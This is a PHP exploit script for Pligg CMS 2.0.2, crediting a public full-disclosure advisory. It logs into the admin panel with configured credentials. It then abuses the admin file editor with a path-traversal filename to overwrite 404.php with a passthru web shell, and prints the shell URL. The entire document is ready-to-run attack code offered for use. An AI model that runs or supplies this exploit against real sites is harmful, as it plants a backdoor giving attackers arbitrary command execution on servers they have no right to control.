<?php
/*

Pligg 2.0.2 - Code Execution
Credits: Curesec Research Team
			-> http://seclists.org/fulldisclosure/2015/Oct/107
Exploit Auther: jb

*/

//////////////////////////////////////////////////
// Config                                       //
//////////////////////////////////////////////////

$username = "admin";
$password = "admin";
$url = "http://127.0.0.1/pligg-cms-master";
$default_backdoor_file = "../../404.php";
$cookie_file = "/tmp/cookies.txt";

//////////////////////////////////////////////////
// End Config                                   //
//////////////////////////////////////////////////

function exploit($url, $data, $type, $cookie) {
	
	$ch = curl_init();

	if($type == "login") {
		$url = $url . "/admin/admin_login.php";
		curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
	} elseif($type == "exploit") {
		$url = $url . "/admin/admin_editor.php";
		curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
	}

	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	$output = curl_exec($ch);
	curl_close($ch);
	return $output;

}


$data = "username=".$username."&password=".$password."&processlogin=1&return=";

if(empty($url)) {
	die("URL is empty.");
} else {
	$login = exploit($url, $data, "login", $cookie_file);
	$sploit = exploit($url, 'the_file2='.$default_backdoor_file.'&updatedfile=<?php passthru($_GET["x"]); ?>&isempty=1&save=Save+Changes', "exploit", $cookie_file);
	if(preg_match_all("/<h3>File Saved<\/h3>/", $sploit)) {
		echo "[*] Exploit Success".PHP_EOL."- shell here: ".$url."/404.php?x=";
	}
}

?>
